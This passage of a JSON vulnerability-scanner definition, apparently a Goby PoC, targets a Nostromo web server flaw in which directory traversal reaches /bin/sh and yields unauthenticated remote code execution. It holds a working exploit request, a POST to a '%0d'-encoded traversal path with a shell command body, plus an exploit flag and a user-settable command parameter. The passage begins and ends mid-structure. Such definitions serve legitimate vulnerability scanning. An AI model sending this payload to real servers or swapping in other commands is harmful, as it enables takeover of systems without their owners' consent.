      "GobyQuery": "product=\"nostromo\"",
      "Description": "Nostromo由于在验证URL安全性方面存在缺陷，导致目录穿越，任何人都可以遍历系统中任何文件。因此未经过身份验证的远程攻击者可以强制服务器指向/bin/sh这样的shell文件，借此执行任意命令。",
      "Product": "Nostromo",
      "Homepage": "http://www.nazgul.ch",
      "Author": "york",
      "Impact": "<p>远程代码执行漏洞</p>",
      "Recommendation": "<p>升级至最新版本1.9.7</p><p><a href>http://www.nazgul.ch/dev/nostromo-1.9.7.tar.gz</a></p>",
      "References": [
            "https://gobies.org/"
      ],
      "HasExp": true,
      "ExpParams": [
            {
                  "Name": "cmd",
                  "Type": "input",
                  "Value": "ifconfig"
            }
      ],
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "OR",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/.%0d./.%0d./.%0d./.%0d./bin/sh",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "echo\r\necho\r\nifconfig 2>&1",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "RX",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "TX",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "errors",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|regex|"
                  ]
            },
            {
                  "Request": {
